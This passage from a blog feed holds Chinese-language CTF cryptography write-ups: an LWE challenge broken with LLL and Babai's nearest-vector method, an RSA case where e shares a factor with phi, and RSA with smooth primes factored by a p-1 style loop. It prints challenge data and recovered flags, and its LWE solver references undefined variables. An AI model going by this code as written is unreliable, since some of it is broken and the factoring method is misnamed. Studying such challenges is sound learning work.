class="number">3</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">1</span>], [<span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">5</span>], [<span class="number">1</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">2</span>, </span><br><span class="line"><span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>]]</span><br><span class="line">    my_dic= &#123;<span class="number">1</span>:<span class="string">&#x27;我&#x27;</span>, <span class="number">2</span>:<span class="string">&#x27;要&#x27;</span>,<span class="number">3</span>:<span class="string">&#x27;拿&#x27;</span>,<span class="number">4</span>:<span class="string">&#x27;西&#x27;</span>,<span class="number">5</span>:<span class="string">&#x27;湖&#x27;</span>,<span class="number">6</span>:<span class="string">&#x27;论&#x27;</span>,<span class="number">7</span>:<span class="string">&#x27;剑&#x27;</span>,<span class="number">8</span>:<span class="string">&#x27;第&#x27;</span>,<span class="number">9</span>:<span class="string">&#x27;一&#x27;</span>&#125;</span><br><span class="line">    re=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">            <span class="built_in">print</span>(my_dic[a[i][j]],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;m = [</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0]</span></span><br><span class="line"><span class="string">    ]&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="随便写点"><a href="#随便写点" class="headerlink" title="随便写点"></a>随便写点</h1><p>维纳压根没看。。</p><p>curve那题发现add（）是可逆的，一开始估计和祥云杯那题有点类似，但是不知道该怎么解出e啊，折磨，后来发现add（G）的规律，只能知道e%4 = 1，不知道有没有用。</p><p>nfsr那题bob找了几个脚本都没跑出来，因为这次mask是64byte的，应该是要用快速相关攻击？</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;题目还不错，难度梯度有点大，出了三道，后面三道难的都不会做&lt;/p&gt;
&lt;p&gt;面向WP学习&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    
    <category term="RSA" scheme="http://sh1k4ku.github.io/tags/RSA/"/>
    
    <category term="Pell Equation" scheme="http://sh1k4ku.github.io/tags/Pell-Equation/"/>
    
    <category term="离散对数" scheme="http://sh1k4ku.github.io/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/"/>
    
    <category term="DSA" scheme="http://sh1k4ku.github.io/tags/DSA/"/>
    
  </entry>
  
  <entry>
    <title>learning with errors</title>
    <link href="http://sh1k4ku.github.io/2021/11/09/2021/learning-with-errors/"/>
    <id>http://sh1k4ku.github.io/2021/11/09/2021/learning-with-errors/</id>
    <published>2021-11-09T04:11:41.000Z</published>
    <updated>2021-11-09T04:40:14.569Z</updated>
    
    <content type="html"><![CDATA[<p>appearCVP</p><span id="more"></span><script type="math/tex; mode=display">v = a*U+s\\已知v，U求a，s作为噪声影响结果，通常情况下很小\\如果没有s，则可直接用高斯消元法求a。\\将U当成格，v是U的线性组合\\原本v在格上，但加入了噪声使得v有些偏离\\要做的就是求v的最近向量，解出CVP，再用高斯消元就可求出a</script><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,V</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random_U</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_U1</span>():</span></span><br><span class="line">        A = Matrix(ZZ, n, n)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,n):</span><br><span class="line">                <span class="keyword">if</span> i&lt;j:</span><br><span class="line">                    A[i,j] = random.randint(<span class="number">1</span>,<span class="number">1000</span>)</span><br><span class="line">                <span class="keyword">if</span> i==j:</span><br><span class="line">                    A[i,j] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> A</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_U2</span>():</span></span><br><span class="line">        A = Matrix(ZZ, n, n)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,n):</span><br><span class="line">                <span class="keyword">if</span> i&gt;j:</span><br><span class="line">                    A[i,j] = random.randint(<span class="number">1</span>,<span class="number">1000</span>)</span><br><span class="line">                <span class="keyword">if</span> i==j:</span><br><span class="line">                    A[i,j] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> A</span><br><span class="line">    <span class="keyword">return</span> get_U1()*get_U2()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_public_key</span>():</span></span><br><span class="line">    U = get_random_U(<span class="number">9</span>)</span><br><span class="line">    V = matrix(V)</span><br><span class="line">    W = V*U</span><br><span class="line">    <span class="keyword">return</span> W</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random_r</span>():</span></span><br><span class="line">    n = <span class="number">9</span></span><br><span class="line">    delta = <span class="number">4</span></span><br><span class="line">    r = random_vector(ZZ, n, x=-delta+<span class="number">1</span>, y=delta)</span><br><span class="line">    r = matrix(r)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>():</span></span><br><span class="line">    M = [getPrime(<span class="number">10</span>)<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>)]</span><br><span class="line">    m = matrix(M)</span><br><span class="line">    W = get_public_key()</span><br><span class="line">    r = get_random_r()</span><br><span class="line">    e = m*W+r</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>,e)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;W =&quot;</span>,W)</span><br><span class="line">    <span class="keyword">return</span> M</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_encrypt</span>():</span></span><br><span class="line">    M = encrypt()</span><br><span class="line">    key = hashlib.sha256(<span class="built_in">str</span>(M).encode()).digest()</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    c = cipher.encrypt(flag).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,c)</span><br><span class="line">new_encrypt()</span><br><span class="line"><span class="comment">#e = [151991736758354 115130361237591  58905390613532 130965235357066  74614897867998  48099459442369  45894485782943   7933340009592     25794185638]</span></span><br><span class="line"><span class="comment">#W = [-10150241248 -11679953514  -8802490385 -12260198788 -10290571893   -334269043 -11669932300  -2158827458     -7021995]</span></span><br><span class="line"><span class="comment">#[ 52255960212  48054224859  28230779201  43264260760  20836572799   8191198018  14000400181   4370731005     14251110]</span></span><br><span class="line"><span class="comment">#[  2274129180  -1678741826  -1009050115   1858488045    978763435   4717368685   -561197285  -1999440633     -6540190]</span></span><br><span class="line"><span class="comment">#[ 45454841384  34351838833  19058600591  39744104894  21481706222  14785555279  13193105539   2306952916      7501297]</span></span><br><span class="line"><span class="comment">#[-16804706629 -13041485360  -8292982763 -16801260566  -9211427035  -4808377155  -6530124040  -2572433293     -8393737]</span></span><br><span class="line"><span class="comment">#[ 28223439540  19293284310   5217202426  27179839904  23182044384  10788207024  18495479452   4007452688     13046387]</span></span><br><span class="line"><span class="comment">#[   968256091  -1507028552   1677187853   8685590653   9696793863   2942265602  10534454095   2668834317      8694828]</span></span><br><span class="line"><span class="comment">#[ 33556338459  26577210571  16558795385  28327066095  10684900266   9113388576   2446282316   -173705548      -577070]</span></span><br><span class="line"><span class="comment">#[ 35404775180  32321129676  15071970630  24947264815  14402999486   5857384379  10620159241   2408185012      7841686]</span></span><br><span class="line"><span class="comment">#c =1070260d8986d5e3c4b7e672a6f1ef2c185c7fff682f99cc4a8e49cfce168aa0</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.modules.free_module_integer <span class="keyword">import</span> IntegerLattice</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c =1070260d8986d5e3c4b7e672a6f1ef2c185c7fff682f99cc4a8e49cfce168aa0</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Babai</span>(<span class="params">L, w</span>):</span></span><br><span class="line">    G, _ = L.gram_schmidt()</span><br><span class="line">    t = w</span><br><span class="line">    i = L.nrows() - <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> i &gt;= <span class="number">0</span>:</span><br><span class="line">        x = (w*G[i]) / G[i].norm()^<span class="number">2</span></span><br><span class="line">        w = w - matrix(ZZ,<span class="built_in">int</span>(<span class="built_in">round</span>(<span class="built_in">float</span>(x[<span class="number">0</span>]) )) * L[i])</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> t - w</span><br><span class="line"></span><br><span class="line">W = [[-<span class="number">10150241248</span> ,-<span class="number">11679953514</span> , -<span class="number">8802490385</span> ,-<span class="number">12260198788</span> ,-<span class="number">10290571893</span>  , -<span class="number">334269043</span>, -<span class="number">11669932300</span> , -<span class="number">2158827458</span> ,    -<span class="number">7021995</span>],</span><br><span class="line">[ <span class="number">52255960212</span> , <span class="number">48054224859</span> , <span class="number">28230779201</span> , <span class="number">43264260760</span> , <span class="number">20836572799</span> ,  <span class="number">8191198018</span> , <span class="number">14000400181</span> ,  <span class="number">4370731005</span>  ,   <span class="number">14251110</span>],</span><br><span class="line">[  <span class="number">2274129180</span> , -<span class="number">1678741826</span> , -<span class="number">1009050115</span> ,  <span class="number">1858488045</span>  ,  <span class="number">978763435</span> ,  <span class="number">4717368685</span> ,  -<span class="number">561197285</span> , -<span class="number">1999440633</span>  ,   -<span class="number">6540190</span>],</span><br><span class="line">[ <span class="number">45454841384</span> , <span class="number">34351838833</span> , <span class="number">19058600591</span> , <span class="number">39744104894</span> , <span class="number">21481706222</span> , <span class="number">14785555279</span> , <span class="number">13193105539</span>  , <span class="number">2306952916</span>   ,   <span class="number">7501297</span>],</span><br><span class="line">[-<span class="number">16804706629</span> ,-<span class="number">13041485360</span> , -<span class="number">8292982763</span> ,-<span class="number">16801260566</span> , -<span class="number">9211427035</span> , -<span class="number">4808377155</span> , -<span class="number">6530124040</span> , -<span class="number">2572433293</span>  ,   -<span class="number">8393737</span>],</span><br><span class="line">[ <span class="number">28223439540</span> , <span class="number">19293284310</span>  , <span class="number">5217202426</span> , <span class="number">27179839904</span> , <span class="number">23182044384</span> , <span class="number">10788207024</span> , <span class="number">18495479452</span> ,  <span class="number">4007452688</span>   ,  <span class="number">13046387</span>],</span><br><span class="line">[   <span class="number">968256091</span> , -<span class="number">1507028552</span> ,  <span class="number">1677187853</span>  , <span class="number">8685590653</span> ,  <span class="number">9696793863</span> ,  <span class="number">2942265602</span> , <span class="number">10534454095</span> ,  <span class="number">2668834317</span>   ,   <span class="number">8694828</span>],</span><br><span class="line">[ <span class="number">33556338459</span> , <span class="number">26577210571</span> , <span class="number">16558795385</span> , <span class="number">28327066095</span> , <span class="number">10684900266</span>  , <span class="number">9113388576</span>  , <span class="number">2446282316</span> ,  -<span class="number">173705548</span>   ,   -<span class="number">577070</span>],</span><br><span class="line">[ <span class="number">35404775180</span> , <span class="number">32321129676</span> , <span class="number">15071970630</span> , <span class="number">24947264815</span> , <span class="number">14402999486</span> ,  <span class="number">5857384379</span> , <span class="number">10620159241</span>  , <span class="number">2408185012</span>   ,   <span class="number">7841686</span>]]</span><br><span class="line">e = [<span class="number">151991736758354</span> ,<span class="number">115130361237591</span> , <span class="number">58905390613532</span> ,<span class="number">130965235357066</span> , <span class="number">74614897867998</span> , <span class="number">48099459442369</span> , <span class="number">45894485782943</span>  , <span class="number">7933340009592</span>   ,  <span class="number">25794185638</span>]</span><br><span class="line"></span><br><span class="line">W = matrix(ZZ, W)</span><br><span class="line">e = matrix(ZZ, e)</span><br><span class="line"></span><br><span class="line">Q = W.LLL()</span><br><span class="line">cvp = Babai(Q,e)</span><br><span class="line"></span><br><span class="line">res = Matrix(W)</span><br><span class="line">res = FLAG.solve_left(cvp)</span><br><span class="line">key = hashlib.sha256(<span class="built_in">str</span>(a).encode()).digest()</span><br><span class="line">key</span><br><span class="line"><span class="comment">#b&#x27;k\x86\xb2s\xff4\xfc\xe1\x9dk\x80N\xffZ?WG\xad\xa4\xea\xa2/\x1dI\xc0\x1eR\xdd\xb7\x87[K&#x27;</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">flag = cipher.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag =&quot;</span>,flag)</span><br><span class="line"><span class="comment">#flag&#123;be5152d04a49234a251956a32b&#125;</span></span><br></pre></td></tr></table></figure><p>这里没有模数，如果有模数就把U扩展一下，在底下加一个p的对角阵，接着用格基规约再babai算法就可以了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;appearCVP&lt;/p&gt;</summary>
    
    
    
    <category term="Crypto" scheme="http://sh1k4ku.github.io/categories/Crypto/"/>
    
    
    <category term="Lattice" scheme="http://sh1k4ku.github.io/tags/Lattice/"/>
    
    <category term="lwe" scheme="http://sh1k4ku.github.io/tags/lwe/"/>
    
  </entry>
  
  <entry>
    <title>做题</title>
    <link href="http://sh1k4ku.github.io/2021/10/26/2021/%E5%81%9A%E9%A2%98/"/>
    <id>http://sh1k4ku.github.io/2021/10/26/2021/%E5%81%9A%E9%A2%98/</id>
    <published>2021-10-26T15:19:45.000Z</published>
    <updated>2021-10-26T15:54:35.107Z</updated>
    
    <content type="html"><![CDATA[<p>做题记录</p><span id="more"></span><h1 id="Defective-RSA"><a href="#Defective-RSA" class="headerlink" title="Defective RSA"></a>Defective RSA</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, inverse, bytes_to_long</span><br><span class="line"></span><br><span class="line">e = <span class="number">1440</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">flag</span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag), e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;q = <span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># e = 1440</span></span><br><span class="line"><span class="comment"># p = 108625855303776649594296217762606721187040584561417095690198042179830062402629658962879350820293908057921799564638749647771368411506723288839177992685299661714871016652680397728777113391224594324895682408827010145323030026082761062500181476560183634668138131801648343275565223565977246710777427583719180083291</span></span><br><span class="line"><span class="comment"># q = 124798714298572197477112002336936373035171283115049515725599555617056486296944840825233421484520319540831045007911288562132502591989600480131168074514155585416785836380683166987568696042676261271645077182221098718286132972014887153999243085898461063988679608552066508889401992413931814407841256822078696283307</span></span><br><span class="line"><span class="comment"># c = 4293606144359418817736495518573956045055950439046955515371898146152322502185230451389572608386931924257325505819171116011649046442643872945953560994241654388422410626170474919026755694736722826526735721078136605822710062385234124626978157043892554030381907741335072033672799019807449664770833149118405216955508166023135740085638364296590030244412603570120626455502803633568769117033633691251863952272305904666711949672819104143350385792786745943339525077987002410804383449669449479498326161988207955152893663022347871373738691699497135077946326510254675142300512375907387958624047470418647049735737979399600182827754</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>gcd(e,phi)=20，直接构造多项式环<script type="math/tex">f = x^20-c\;mod\;p(q)</script>，之后对结构用crt即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">1440</span></span><br><span class="line">p = <span class="number">108625855303776649594296217762606721187040584561417095690198042179830062402629658962879350820293908057921799564638749647771368411506723288839177992685299661714871016652680397728777113391224594324895682408827010145323030026082761062500181476560183634668138131801648343275565223565977246710777427583719180083291</span></span><br><span class="line">q = <span class="number">124798714298572197477112002336936373035171283115049515725599555617056486296944840825233421484520319540831045007911288562132502591989600480131168074514155585416785836380683166987568696042676261271645077182221098718286132972014887153999243085898461063988679608552066508889401992413931814407841256822078696283307</span></span><br><span class="line">c = <span class="number">4293606144359418817736495518573956045055950439046955515371898146152322502185230451389572608386931924257325505819171116011649046442643872945953560994241654388422410626170474919026755694736722826526735721078136605822710062385234124626978157043892554030381907741335072033672799019807449664770833149118405216955508166023135740085638364296590030244412603570120626455502803633568769117033633691251863952272305904666711949672819104143350385792786745943339525077987002410804383449669449479498326161988207955152893663022347871373738691699497135077946326510254675142300512375907387958624047470418647049735737979399600182827754</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res1 = f.roots()</span><br><span class="line"> </span><br><span class="line">R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">f = x ^e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res2 = f.roots()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">        m=crt(<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>]),p,q)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也可以这么构造：</p><script type="math/tex; mode=display">(m * x) ^ e \;= \;c\;(mod \;n)\\      x ^ e \;= \;1  \;(mod \;n)</script><p>然后寻求这个新多项式下的解x即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">roots_of_unity</span>(<span class="params">e, phi, n, rounds=<span class="number">500</span></span>):</span></span><br><span class="line">   </span><br><span class="line">    phi_coprime = phi</span><br><span class="line">    <span class="keyword">while</span> cun.GCD(phi_coprime, e) != <span class="number">1</span>:</span><br><span class="line">        phi_coprime //= cun.GCD(phi_coprime, e)</span><br><span class="line"></span><br><span class="line">    roots = <span class="built_in">set</span>(<span class="built_in">pow</span>(i, phi_coprime, n) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, rounds))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">all</span>(<span class="built_in">pow</span>(root, e, n) == <span class="number">1</span> <span class="keyword">for</span> root <span class="keyword">in</span> roots)</span><br><span class="line">    <span class="keyword">return</span> roots, phi_coprime</span><br></pre></td></tr></table></figure><h1 id="pollards-RSA"><a href="#pollards-RSA" class="headerlink" title="pollards_RSA"></a>pollards_RSA</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> is_prime, mpz</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line"></span><br><span class="line">rand = SystemRandom()</span><br><span class="line">PRIMES = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">53</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span>(<span class="params">bit_length</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = mpz(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">while</span> x.bit_length() &lt; bit_length:</span><br><span class="line">            x *= rand.choice(PRIMES)</span><br><span class="line">        <span class="keyword">if</span> is_prime(x + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> x + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">p = get_prime(<span class="number">1024</span>)</span><br><span class="line">q = get_prime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>用pollards_rho方法分解n。这也说明了用小素数来生成素数非常不安全</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> mul</span><br><span class="line"></span><br><span class="line">PRIMES = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">53</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollards_rho</span>(<span class="params">n</span>):</span></span><br><span class="line">    x = <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        x = <span class="built_in">pow</span>(<span class="built_in">pow</span>(x, reduce(mul, PRIMES), n),reduce(mul, PRIMES),n)</span><br><span class="line">        g = gmpy2.gcd(x - <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span> &lt; g &lt; n:</span><br><span class="line">            <span class="built_in">print</span>(_)</span><br><span class="line">            <span class="keyword">return</span> g</span><br></pre></td></tr></table></figure><p>x求值那里可以从两轮改成一轮，两轮的目的是加快速度，但有时候可能会错失解，对这题来说问题不大</p><h1 id="Key-exchange"><a href="#Key-exchange" class="headerlink" title="Key exchange"></a>Key exchange</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 